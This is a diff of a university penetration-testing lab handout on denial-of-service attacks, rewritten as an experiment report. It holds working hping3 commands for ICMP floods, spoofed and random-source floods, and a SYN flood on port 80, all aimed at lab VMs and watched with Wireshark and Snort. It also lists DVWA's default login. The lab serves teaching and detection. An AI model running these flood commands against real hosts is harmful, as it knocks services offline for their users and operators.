@@ -1,62 +1,94 @@
-Vulnerability Assessment and Penetration Testing (23CYL65) Lab
-7. Denial of Service (DoS) Attack Using Hping3
-
-Imagine you are the network security administrator for a medium-sized e-commerce company that operates an online store handling sensitive customer information. Recently, there have been reports of intermittent service disruptions and slow response times on your company's website, resulting in customer complaints & loss of revenue. After conducting initial investigations, you suspect that website may be experiencing denial-of-service (DoS) attacks, specifically SYN floods and Ping flood attacks. So, it is important for organizations to have response plans in place to mitigate the impact of DoS attacks on their operations. Use Hping3, kali Linux tool to perform SYN floods and ping flood attacks to launch DOS attack on the target machine and proactively monitor the networks for signs of attack.
-
-A Denial of Service Attack is a cyber-attack in which the attacker seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely distributing services of a host connected to the internet. DOS attack is typically accomplished by flooding the targeted machine or resource with superfluous requests in an attempt to overload systems.
-
-Ping Flood DoS Attack
-Ping Network Utility
-Ping is a troubleshooting tool used by system administrators to manually test for connectivity between network devices and also for network delay and packet loss.
-The Ping command sends an ICMP echo request to a device on the network, and device responds with ICMP echo reply.
-The data returned in echo request message must be returned in the echo reply message.
-Exercise
-
-Ensure Kali Linux and Ubuntu vm are up and running. Ping from kali linux machine to Ubuntu.
-
-ping 192.168.62.133
-
-Start capturing ICMP request/reply from Wireshark.
-
-Once you capture and can notice in Wireshark analyzer, the ICMP packet request and ICMP packet reply.
-
-Hping3 Tool Demo
-
-Hping3 tool is used to generate lot of ICMP request packets. (i.e. flooding our target with lot of ping packets)
-
-Wireshark used as a packet analyzer. Ubuntu is a target machine.
-
-In Ubuntu Install Snort (Intrusion Detection System) by using below command.
-
+Experiment 7 — DoS Attack using Hping3
+(Ping Flood & SYN Flood)
+Aim
+To perform Ping Flood and SYN Flood Denial of Service (DoS) attacks using Hping3 tool.
+Theory
+Denial of Service (DoS) Attack
+A Denial of Service attack is a cyber attack in which an attacker attempts to make a machine or
+network resource unavailable to legitimate users by flooding the target with excessive traffic.
+Ping Flood Attack
+Ping Flood attack sends a large number of ICMP Echo Request packets to the target system,
+consuming network bandwidth and system resources.
+SYN Flood Attack
+SYN Flood attack exploits the TCP three-way handshake by sending numerous SYN packets
+without completing the connection, causing the server to become overloaded.
+Hping3
+Hping3 is a packet crafting and network testing tool used for generating TCP, UDP, and ICMP
+packets. It is commonly used for firewall testing, network analysis, and DoS attacks.
+Requirements
+• Kali Linux VM
+• Ubuntu VM
+• Metasploitable2 VM
+• Wireshark
+• Snort IDS
+• Hping3 Tool
+Procedure
+Part A — Ping Flood Attack
+Step 1: Start Virtual Machines
+• Start Kali Linux VM
+• Start Ubuntu VM
+Step 2: Test Connectivity
+In Kali terminal:
+ping 192.168.245.134
+Observation:
+• ICMP request and reply packets are observed.
+Step 3: Start Wireshark
+• Open Wireshark in Ubuntu VM.
+• Start packet capture.
+Observation:
+• ICMP Echo Request and Echo Reply packets are captured.
+Step 4: Install Snort
+In Ubuntu terminal:
 sudo apt-get install snort -y
-
-and keep the IDS ready for observing the packet transfer by using below command.
-
+Step 5: Start Snort IDS
+Command:
 sudo snort -A console -c /etc/snort/snort.conf
-
-Then in Kali linux machine run the hping2 tool commands. And observe Ubuntu snort output and Wireshark analyzer output for the flood of packets.
-
-a. sudo hping3 -1 -c 1 192.168.62.133
-
-b. sudo hping3 -1 -c 1 -i 5 192.168.62.133
-
-c. sudo hping3 -1 --faster 192.168.62.133
-
-d. sudo hping3 -1 --faster 192.168.62.133
-
-e. sudo hping3 -1 -a 192.168.62.139 192.168.62.133
-
-f. sudo hping3 -1 --rand-source 192.168.62.133
-TCP 3-Way Handshake
-
-For SYN Flood Attack, use below commands. Ensure Kali Linux and Metaspoiltable2 are up and running.
-
-In kali linux browser, type metaspoiltable 2 IP to launch DVWA application, login.
-
-a. sudo hping3 -S -c 1 -p 80 192.168.62.129
-
-b. sudo hping3 -S -c 1 -p 80 -i 5 192.168.62.129
-
-c. sudo hping3 -S --flood -p 80 192.168.62.129
-
-Once the target machine is flooded with Syn packets, observe in the wireshark analyzer, you can see target system (metaspoiltable2 Vm) is flooded with packets. And DVWA application is taking time to load.
+Observation:
+• Snort starts monitoring packets.
+Step 6: Perform Ping Flood Attacks
+a) Send Single ICMP Packet
+sudo hping3 -1 -c 1 192.168.245.134
+b) ICMP Packet with Delay
+sudo hping3 -1 -c 1 -i 5 192.168.245.134
+c) Faster Flood Attack
+sudo hping3 -1 --faster 192.168.245.134
+d) Continuous Flood Attack
+sudo hping3 -1 --faster 192.168.245.134
+e) Spoofed Source Address
+sudo hping3 -1 -a 192.168.245.128 192.168.245.134
+f) Random Source Flood
+sudo hping3 -1 --rand-source 192.168.245.134
+Observation:
+• Large number of ICMP packets observed in Wireshark.
+• Snort detects abnormal traffic.
+• Network traffic increases heavily.
+Part B — SYN Flood Attack
+Step 7: Start Machines
+• Start Kali Linux VM
+• Start Metasploitable2 VM
+Step 8: Open DVWA
+In browser:
+http://192.168.245.133/dvwa
+Login:
+Username: admin
+Password: password
+Step 9: Perform SYN Flood Commands
+a) Send Single SYN Packet
+sudo hping3 -S -c 1 -p 80 192.168.245.133
+b) SYN Packet with Delay
+sudo hping3 -S -c 1 -p 80 -i 5 192.168.245.133
+c) SYN Flood Attack
+sudo hping3 -S --flood -p 80 192.168.245.133
+Observation:
+• Huge number of SYN packets captured in Wireshark.
+• DVWA webpage becomes slow or unresponsive.
+Observation
+• ICMP flood increases network traffic significantly.
+• SYN flood overloads target server resources.
+• Wireshark captures packet flooding activity.
+• Snort IDS detects suspicious packets.
+Result
+Successfully performed:
+• Ping Flood DoS Attack
+• SYN Flood DoS Attack
+using Hping3 tool.
